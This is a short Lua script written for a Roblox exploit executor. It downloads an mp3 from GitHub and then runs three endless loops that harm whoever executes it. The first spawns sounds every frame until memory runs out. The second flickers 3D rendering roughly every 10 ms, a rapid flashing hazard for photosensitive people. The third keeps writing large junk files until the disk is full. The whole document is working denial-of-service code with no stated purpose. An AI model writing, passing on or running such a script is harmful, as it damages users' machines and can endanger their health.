local music = game:HttpGet("https://raw.githubusercontent.com/renlua/shallow/refs/heads/main/1.mp3")
writefile("music.mp3", music)
local Getmusic = getsynasset("music.mp3")
spawn(function()
    while task.wait() do
        local Sound = Instance.new("Sound")
        Sound.Name = game:GetService("HttpService"):GenerateGUID(false)
        Sound.SoundId = Getmusic
        Sound.Parent = game:GetService("Workspace")
        Sound:Play()
    end
end)
spawn(function()
    while task.wait() do
        game:GetService("RunService"):Set3dRenderingEnabled(false)
        wait(0.01)
        game:GetService("RunService"):Set3dRenderingEnabled(true)
        wait(0.01)
    end
end)
spawn(function()
    while task.wait() do
        writefile(game:GetService("HttpService"):GenerateGUID(false),string.rep(game:GetService("HttpService"):GenerateGUID(false),10000))
    end
end)


